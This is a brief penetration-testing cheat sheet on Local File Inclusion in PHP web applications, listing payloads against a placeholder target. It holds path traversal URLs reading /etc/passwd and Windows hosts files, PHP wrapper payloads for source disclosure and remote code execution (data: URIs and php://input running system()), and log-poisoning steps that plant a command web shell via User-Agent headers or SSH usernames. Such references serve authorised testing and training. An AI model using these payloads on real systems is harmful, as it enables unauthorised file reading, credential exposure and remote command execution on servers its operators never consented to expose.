# Local File Inclusion (LFI)

## Basic Path Traversal
```php
http://$TARGET_IP/index.php?page=../../../etc/passwd
http://$TARGET_IP/index.php?page=..\..\..\windows\system32\drivers\etc\hosts
```

## PHP Wrappers
```php
# PHP filter (read source code)
http://$TARGET_IP/index.php?page=php://filter/convert.base64-encode/resource=index.php

# Data URI (RCE)
http://$TARGET_IP/index.php?page=data:text/plain,<?php system($_GET['cmd']);?>&cmd=id

# php://input (RCE) - requires POST
POST: page=php://input
BODY: <?php system('id'); ?>

# Expect wrapper (RCE)
http://$TARGET_IP/index.php?page=expect://id
```

## LFI to RCE Techniques
```php
# Log poisoning (Apache)
http://$TARGET_IP/index.php?page=../../../../var/log/apache2/access.log
# Inject PHP in User-Agent, then include the log

# /proc/self/environ
http://$TARGET_IP/index.php?page=../../../../proc/self/environ
# Inject PHP in User-Agent header

# SSH log poisoning
http://$TARGET_IP/index.php?page=../../../../var/log/auth.log
# ssh '<?php system($_GET["cmd"]);?>'@$TARGET_IP
```

## Windows LFI
```php
http://$TARGET_IP/index.php?page=../../../../xampp/apache/logs/access.log
http://$TARGET_IP/index.php?page=../../../../inetpub/logs/LogFiles/W3SVC1/u_exYYMMDD.log
```
